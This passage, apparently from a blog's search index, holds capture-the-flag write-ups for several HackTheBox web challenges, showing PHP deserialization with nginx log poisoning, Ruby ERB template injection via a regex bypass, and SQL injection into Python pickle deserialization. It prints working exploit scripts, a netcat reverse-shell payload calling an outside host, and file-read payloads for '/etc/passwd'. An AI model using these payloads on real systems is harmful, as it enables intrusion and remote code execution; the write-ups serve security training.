&#123;&#123;.ClientIpInfo.Continent&#125;&#125;&lt;/li&gt; &lt;li&gt;Continent Code: &#123;&#123;.ClientIpInfo.ContinentCode&#125;&#125;&lt;/li&gt; &lt;/ul&gt;&lt;/body&gt;&lt;/html&gt; Using web hook, paste the html template into the response. Great we can render the page. Next we can just edit to call the FetchServerInfo and we got the result total 10172drwxr-xr-x 1 root root 4096 Dec 17 12:54 .drwxr-xr-x 1 root root 4096 Dec 17 12:54 ..-rw-r--r-- 1 root root 4786 Sep 11 14:11 main.go-rwxr-xr-x 1 root root 10387927 Dec 17 12:54 renderquestdrwxr-xr-x 4 root root 4096 Sep 7 23:12 staticdrwxr-xr-x 2 root root 4096 Sep 7 23:12 templates Toxic - Easy Humanity has exploited our allies, the dart frogs, for far too long, take back the freedom of our lovely poisonous friends. Malicious input is out of the question when dart frogs meet industrialisation. ğŸ¸ In index.php if (empty($_COOKIE[&#x27;PHPSESSID&#x27;]))&#123; $page = new PageModel; $page-&gt;file = &#x27;/www/index.html&#x27;; setcookie( &#x27;PHPSESSID&#x27;, base64_encode(serialize($page)), time()+60*60*24, &#x27;/&#x27; );&#125; $cookie = base64_decode($_COOKIE[&#x27;PHPSESSID&#x27;]);unserialize($cookie); The page is deserialize the cookie to render the page. The url file page being render is being indicate in the file attribute. Below is the breakdown of the seralized object - `O:9:&quot;PageModel&quot;:1`: - `O`: Denotes an object. - `9`: The length of the serialized string. - `&quot;PageModel&quot;`: Name of the class (in this case, &quot;PageModel&quot;). - `1`: Indicates there is 1 property in the serialized object.- `&#123;s:4:&quot;file&quot;;s:15:&quot;/www/index.html&quot;;&#125;`: - `s:4:&quot;file&quot;;`: Represents a string with a length of 4 characters for the property name &quot;file&quot;. - `s:15:&quot;/www/index.html&quot;;`: Represents a string with a length of 15 characters for the value &quot;/www/index.html&quot;. The only field we have to modify is the s:15:&quot;/www/index.html&quot;. Then we can have a control of what is being render in the page. â”Œâ”€â”€(ikonwã‰¿Xing)-[~/Desktop/htb_challenge/RenderQuest]â””â”€$ echo &#x27;O:9:&quot;PageModel&quot;:1:&#123;s:4:&quot;file&quot;;s:11:&quot;/etc/passwd&quot;;&#125;&#x27; | base64Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxMToiL2V0Yy9wYXNzd2QiO30K After some trial and error, I dont seem to show the /flag.txt. Checking the docker it seems the filename is being by randomly renamed in entrypoint.sh !/bin/ash# Secure entrypointchmod 600 /entrypoint.sh# Generate random flag filenamemv /flag /flag_`cat /dev/urandom | tr -dc &#x27;a-zA-Z0-9&#x27; | fold -w 5 | head -n 1`exec &quot;$@&quot; we have no way to extract the file without knowing the name. Since we are able to have local file inclusion, we can always perform log poisoning. Review the Dockerfile, the webserver is using nginx, which means we can find the access.log file located at /var/log/nginx/access.log Changed the User-Agent to executes PHP codes Below is the full script to extract the flag name and the content using regex. import requestsimport base64import reurl = &quot;http://167.99.85.216:30412/&quot;cookie = b&#x27;O:9:&quot;PageModel&quot;:1:&#123;s:4:&quot;file&quot;;s:25:&quot;/var/log/nginx/access.log&quot;;&#125;&#x27;cookie = base64.b64encode(cookie)header = &#123;&quot;PHPSESSID&quot;: cookie.decode()&#125;print(cookie)headers = &#123;&quot;User-Agent&quot;: &quot;&lt;?php system(&#x27;ls -la /&#x27;)?&gt;&quot;&#125;r = requests.get(url,cookies=header, headers=headers)flag = re.search(r&#x27;\\bflag_\\w+\\b&#x27;, r.text, flags=re.IGNORECASE)flag = flag.group()headers = &#123;&quot;User-Agent&quot;: f&quot;&lt;?php system(&#x27;cat /&#123;flag&#125;&#x27;)?&gt;&quot;&#125;print(headers)r = requests.get(url,cookies=header, headers=headers)print(r.text) Neonify - Easy Itâ€™s time for a shiny new reveal for the first-ever text neonifier. Come test out our brand new website and make any text glow like a lo-fi neon tube! In neon.rb file indicate POST method route seems using ERB template engine to render user inputs. class NeonControllers &lt; Sinatra::Base configure do set :views, &quot;app/views&quot; set :public_dir, &quot;public&quot; end get &#x27;/&#x27; do @neon = &quot;Glow With The Flow&quot; erb :&#x27;index&#x27; end post &#x27;/&#x27; do if params[:neon] =~ /^[0-9a-z ]+$/i @neon = ERB.new(params[:neon]).result(binding) else @neon = &quot;Malicious Input Detected&quot; end erb :&#x27;index&#x27; end The regex match the start and the end of the line, and matches alphanumeric and whitespace only. With some research that Ruby regex has some form of insecure use of Regular expressions. According to hacktrick we can supply the following payload for reading files &lt;%= File.open(&#x27;/etc/passwd&#x27;).read %&gt; In order to abuse the insecure regex in ruby, burp request seems have problem with the \\n. We can just firefox to modify the request to manually append a new line just like this in network tab However I did receive a 400 error request. After some research, I perform a URL encode seems to get the things right neon=a%3C%25%3D%20File.open(%27%2Fetc%2Fpasswd%27).read%20%25%3E Yeah, manage to read the file, now we can just change /etc/passwd to /flag.txt and we got the flag. C.O.P - Easy The C.O.P (Cult of Pickles) have started up a new web store to sell their merch. We believe that the funds are being used to carry out illicit pickle-based propaganda operations! Investigate the site and try and find a way into their operation! Perform a blackbox approach first, found the site shows the ID of the item. Found the item to be listed on the URL http://localhost:1337/view/1 Tried with sqlmap to identify any possible SQLi. However thereâ€™s some problem with the URL, as it dont have paramter to inject, need to manually added a * in burp request and save it GET /view/1* HTTP/1.1Host: localhost:1337User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate, brConnection: closeUpgrade-Insecure-Requests: 1Sec-Fetch-Dest: documentSec-Fetch-Mode: navigateSec-Fetch-Site: noneSec-Fetch-User: ?1 sqlmap -r requests.txt --dump-all+----+----------------------------------------------------------------------------------| id | data | created_at |+----+----------------------------------------------------------------------------------| 1 | gASVoAAAAAAAAACMFGFwcGxpY2F0aW9uLmRhdGFiYXNllIwESXRlbZSTlCmBlH2UKIwEbmFtZZSMDFBpY2tsZSBTaGlydJSMC2Rlc2NyaXB0aW9ulIwZR2V0IG91ciBuZXcgcGlja2xlIHNoaXJ0IZSMBWltYWdllIwfL3N0YXRpYy9pbWFnZXMvcGlja2xlX3NoaXJ0LmpwZ5SMBXByaWNllIwCMjOUdWIu | 2024-01-02 13:44:09 || 2 | gASVrAAAAAAAAACMFGFwcGxpY2F0aW9uLmRhdGFiYXNllIwESXRlbZSTlCmBlH2UKIwEbmFtZZSMDlBpY2tsZSBTaGlydCAylIwLZGVzY3JpcHRpb26UjCJHZXQgb3VyIChzZWNvbmQpIG5ldyBwaWNrbGUgc2hpcnQhlIwFaW1hZ2WUjCAvc3RhdGljL2ltYWdlcy9waWNrbGVfc2hpcnQyLmpwZ5SMBXByaWNllIwCMjeUdWIu | 2024-01-02 13:44:09 || 3 | gASVnQAAAAAAAACMFGFwcGxpY2F0aW9uLmRhdGFiYXNllIwESXRlbZSTlCmBlH2UKIwEbmFtZZSMD0RpbGwgUGlja2xlIEphcpSMC2Rlc2NyaXB0aW9ulIwXTGl0ZXJhbGx5IGp1c3QgYSBwaWNrbGWUjAVpbWFnZZSMGS9zdGF0aWMvaW1hZ2VzL3BpY2tsZS5qcGeUjAVwcmljZZSMBDEzMzeUdWIu | 2024-01-02 13:44:09 || 4 | gASVsgAAAAAAAACMFGFwcGxpY2F0aW9uLmRhdGFiYXNllIwESXRlbZSTlCmBlH2UKIwEbmFtZZSMD0JyYW5zdG9uIFBpY2tsZZSMC2Rlc2NyaXB0aW9ulIwjRG9lcyB0aGlzIGV2ZW4gZml0IG9uIG91ciBzdG9yZT8hPyGUjAVpbWFnZZSMIi9zdGF0aWMvaW1hZ2VzL2JyYW5zdG9uX3BpY2tsZS5qcGeUjAVwcmljZZSMBDcuMzCUdWIu | 2024-01-02 13:44:09 |+----+---------------------------------------------------------------------------------- Found some encoded value, decode with base64 seems like some seralization. Proceed with source code analysis. class shop(object): @staticmethod def select_by_id(product_id): return query_db(f&quot;SELECT data FROM products WHERE id=&#x27;&#123;product_id&#125;&#x27;&quot;, one=True) The parameter does not have any sanitization The application seems to serialized the item object and base64 encode and save it in database. @app.template_filter(&#x27;pickle&#x27;)def pickle_loads(s): return pickle.loads(base64.b64decode(s)) In item.html the template engine deserialize the items and render on webpage. &#123;% set item = product | pickle %&#125; Since it dont have any restriction, we can passed in a base64 encoded object that trigger a os.system command to achieve RCE. In the payload class, we use the __reduce__ method to create and return a tuple that includes the operating system command as an argument. Then, from that payload class, we create an object, serialize and encode it. Once again, using Base64, weâ€™ll just need the input from there. import base64import osimport picklepayload = &#x27;nc 172.17.0.1 4444 -e /bin/sh&#x27;class exploit: def __reduce__(self): return os.system, (payload,)if __name__ == &#x27;__main__&#x27;: print(base64.urlsafe_b64encode(pickle.dumps(exploit())).decode(&#x27;ascii&#x27;)) From here we got the base64 encoded string gASVOAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjB1uYyAxNzIuMTcuMC4xIDQ0NDQgLWUgL2Jpbi9zaJSFlFKULg== Now we have to construct the parameter that abuse the SQLI to deserizlise malicious object.&#96; http://localhost:1337/view/&#x27;%20UNION%20SELECT%20&#x27;gASVOAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjB1uYyAxNzIuMTcuMC4xIDQ0NDQgLWUgL2Jpbi9zaJSFlFKULg== EasterBunny - Easy Itâ€™s that time of the year again! Write a letter to the Easter bunny and make your wish come true! But be careful what you wish for because the Easter bunnyâ€™s helpers are watching! Break down the routes.js router.get(&quot;/&quot;, (req, res) =&gt; &#123; return res.render(&quot;index.html&quot;, &#123; cdn: `$&#123;req.protocol&#125;://$&#123;req.hostname&#125;:$&#123;req.headers[&quot;x-forwarded-port&quot;] ?? 80&#125;/static/`, &#125;);&#125;); The / path define that, it will render the index.html and pass the CDN url to it. To be more detailed as not familiar with node js syntax. The $$ operator used here is the Nullish Coalescing Operator in javascript. It returns the value if the left hand operand if itâ€™s not null or undefined. If the left-hand side is null or uundefined it returns the right hand operand in this case is 80 cdn: `$&#123;req.protocol&#125;://$&#123;req.hostname&#125;:$&#123;req.headers[&quot;x-forwarded-port&quot;] ?? 80&#125;/static/`, same goes to the second endpoint /letter router.get(&quot;/letters&quot;, (req, res) =&gt; &#123; return res.render(&quot;viewletters.html&quot;, &#123; cdn: `$&#123;req.protocol&#125;://$&#123;req.hostname&#125;:$&#123;req.headers[&quot;x-forwarded-port&quot;] ?? 80&#125;/static/`, &#125;);&#125;); third endpoint /submit. Its a post method, checking if parameter message is exist in the request body. if it does not exist or empty it will exit. Next, if the message exist, it will inject the message into database using the method db.insertMessage. If the message is successful insert into database, it will trigger a bot to visit the speceific URL router.post(&quot;/submit&quot;, async (req, res) =&gt; &#123; const &#123; message &#125; = req.body; if (message) &#123; return db.insertMessage(message) .then(async inserted =&gt; &#123; try &#123; botVisiting = true; await visit(`http://127.0.0.1/letters?id=$&#123;inserted.lastID&#125;`, authSecret); botVisiting = false; &#125; catch (e) &#123; console.log(e); botVisiting = false; &#125; res.status(201).send(response(inserted.lastID)); &#125;) .catch(() =&gt; &#123; res.status(500).send(response(&#x27;Something went wrong!&#x27;)); &#125;); &#125; return res.status(401).send(response(&#x27;Missing required parameters!&#x27;));&#125;);","categories":[],"tags":[]}],"categories":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://ik0nw.github.io/categories/hackthebox/"},{"name":"php-audit","slug":"php-audit","permalink":"https://ik0nw.github.io/categories/php-audit/"},{"name":"hackthebox-challenge","slug":"hackthebox-challenge","permalink":"https://ik0nw.github.io/categories/hackthebox-challenge/"},{"name":"mobile","slug":"hackthebox-challenge/mobile","permalink":"https://ik0nw.github.io/categories/hackthebox-challenge/mobile/"},{"name":"HackTheBox-Hard","slug":"HackTheBox-Hard","permalink":"https://ik0nw.github.io/categories/HackTheBox-Hard/"},{"name":"CTF","slug":"CTF","permalink":"https://ik0nw.github.io/categories/CTF/"},{"name":"misc","slug":"hackthebox-challenge/misc","permalink":"https://ik0nw.github.io/categories/hackthebox-challenge/misc/"},{"name":"HackTheBox-Medium","slug":"HackTheBox-Medium","permalink":"https://ik0nw.github.io/categories/HackTheBox-Medium/"}],"tags":[{"name":"offsec","slug":"offsec","permalink":"https://ik0nw.github.io/tags/offsec/"},{"name":"hackthebox","slug":"hackthebox","permalink":"https://ik0nw.github.io/tags/hackthebox/"},{"name":"easy","slug":"easy","permalink":"https://ik0nw.github.io/tags/easy/"},{"name":"medium","slug":"medium","permalink":"https://ik0nw.github.io/tags/medium/"},{"name":"PHP,in_array(),type-juggling","slug":"PHP-in-array-type-juggling","permalink":"https://ik0nw.github.io/tags/PHP-in-array-type-juggling/"},{"name":"PHP,preg_replace()","slug":"PHP-preg-replace","permalink":"https://ik0nw.github.io/tags/PHP-preg-replace/"},{"name":"reverse","slug":"reverse","permalink":"https://ik0nw.github.io/tags/reverse/"},{"name":"mysql exec_cmd","slug":"mysql-exec-cmd","permalink":"https://ik0nw.github.io/tags/mysql-exec-cmd/"},{"name":"gitalk","slug":"gitalk","permalink":"https://ik0nw.github.io/tags/gitalk/"},{"name":"hard","slug":"hard","permalink":"https://ik0nw.github.io/tags/hard/"},{"name":"forensic","slug":"forensic","permalink":"https://ik0nw.github.io/tags/forensic/"},{"name":"smb","slug":"smb","permalink":"https://ik0nw.github.io/tags/smb/"}]}